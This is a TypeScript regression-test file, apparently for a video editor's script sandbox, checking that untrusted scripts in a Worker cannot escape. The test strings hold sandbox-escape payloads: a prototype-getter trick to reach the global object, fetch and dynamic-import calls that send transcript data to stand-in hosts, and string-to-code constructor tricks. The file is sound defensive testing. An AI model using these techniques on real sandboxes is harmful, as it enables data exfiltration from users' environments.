/* bugs da revisão r3 (IA): cada teste falhava antes da correção */
import vm from 'node:vm';
import { describe, expect, it } from 'vitest';
import { applyOps, type EditOp } from '../ops';
import { createProject, makeVideoClip } from '../defaults';
import type { MediaAsset, Project } from '../types';
import { runSandboxed } from './script/sandbox';
import { runScript, scriptInput, workerSource } from './script/run';

const src: MediaAsset = { id: 'a1', kind: 'video', role: 'source', name: 'b.mp4', mime: 'video/mp4', size: 1, duration: 20 };
const assets: Record<string, MediaAsset> = { a1: src };
const base = (): Project => applyOps(createProject(), [
  { op: 'add_clip', trackId: 'track_video_1', clip: { ...makeVideoClip(src, 0), id: 'c1', duration: 10 } },
] as EditOp[]).project;

/**
 * Sobe o código do Worker num contexto vm parecido com o escopo de um Worker: `fetch`/`importScripts`/
 * `postMessage` moram no PROTÓTIPO do global (como em WorkerGlobalScope.prototype) e anotam as chamadas.
 */
function bootWorker() {
  const ctx = vm.createContext({ __net: [] as string[], __posted: [] as unknown[] });
  vm.runInContext(`
    globalThis.self = globalThis;
    Object.setPrototypeOf(globalThis, {
      fetch(u) { __net.push('fetch ' + u); },
      importScripts(u) { __net.push('importScripts ' + u); },
      postMessage(d) { __posted.push(d); },
      setTimeout(f) { __net.push('setTimeout ' + typeof f); },
    });`, ctx);
  vm.runInContext(workerSource(), ctx);
  const run = (code: string) => {
    const before = (ctx.__posted as unknown[]).length;
    vm.runInContext('self.onmessage({ data: __msg })', Object.assign(ctx, { __msg: { code, input: scriptInput(base(), assets), maxOps: 3000 } }));
    return (ctx.__posted as unknown[]).slice(before);
  };
  return { run, net: ctx.__net as string[] };
}

/* acesso ao global sem citar `self`/`globalThis`: getter em Object.prototype lido como nome livre */
const GLOBAL = "Object.defineProperty(Object.prototype, 'zz', { get() { return this; }, configurable: true }); const g = zz; delete Object.prototype.zz;";

describe('run_script: o Worker não deixa o script sair para a rede', () => {
  it('fetch no protótipo do escopo global não sobra (antes: WorkerGlobalScope.prototype.fetch funcionava)', () => {
    const w = bootWorker();
    const out = w.run(`${GLOBAL} let o = g; while (o) { if (Object.prototype.hasOwnProperty.call(o, 'fetch') && typeof o.fetch === 'function') o.fetch.call(g, 'http://x/vazou'); if (Object.prototype.hasOwnProperty.call(o, 'importScripts') && o.importScripts) o.importScripts('http://x/s.js'); o = Object.getPrototypeOf(o); } ep.text({ text: 'ok', start: 0, duration: 1 });`);
    expect(w.net).toEqual([]);
    expect(out).toHaveLength(1);
    expect((out[0] as { ops: unknown[] }).ops).toHaveLength(1);
  });

  it('texto -> código some (Function, eval, setTimeout e os construtores de funções async/geradoras)', () => {
    const w = bootWorker();
    const cases = [
      `Function('return 1')`,
      `${GLOBAL} g.eval('1')`,
      `${GLOBAL} g.setTimeout('1', 0)`,
      `(async () => {}).constructor('return 1')`,
      `(function* () {}).constructor('yield 1')`,
      `(() => {}).constructor('return 1')`,
    ];
    for (const code of cases) {
      const [res] = w.run(code) as { error?: string }[];
      expect(res.error, code).toMatch(/not a function|is not defined|undefined/);
    }
    expect(w.net).toEqual([]);
  });

  it('import() é recusado (é sintaxe: nem o parâmetro sombreado nem o Worker conseguem tirar)', () => {
    const r = runSandboxed(`import('https://exemplo.com/x.js?d=' + JSON.stringify(ep.words())); return [];`, scriptInput(base(), assets));
    expect('error' in r && r.error).toMatch(/import não é permitido/);
    // texto com "importante" continua valendo
    const ok = runSandboxed(`ep.text({ text: 'O mais importante', start: 0, duration: 1 });`, scriptInput(base(), assets));
    expect('ops' in ok && ok.ops).toHaveLength(1);
  });

  it('o script não forja a resposta do Worker (postMessage capturado; resposta sem ops vira erro)', async () => {
    const w = bootWorker();
    const out = w.run(`${GLOBAL} if (g.postMessage) g.postMessage({ hello: 1 }); return [];`);
    expect(out).toEqual([{ ops: [], logs: [] }]);
    // e mesmo que algo chegue fora da forma, o runScript não quebra o finalize (r.ops.length em undefined)
    const fake = { onmessage: null as ((ev: MessageEvent) => void) | null, onerror: null, terminate() {}, postMessage() { setTimeout(() => this.onmessage?.({ data: { hello: 1 } } as MessageEvent), 0); } };
    const r = await runScript('return []', base(), assets, { makeWorker: () => fake });
    expect('error' in r && r.error).toMatch(/inválida/);
  });
});
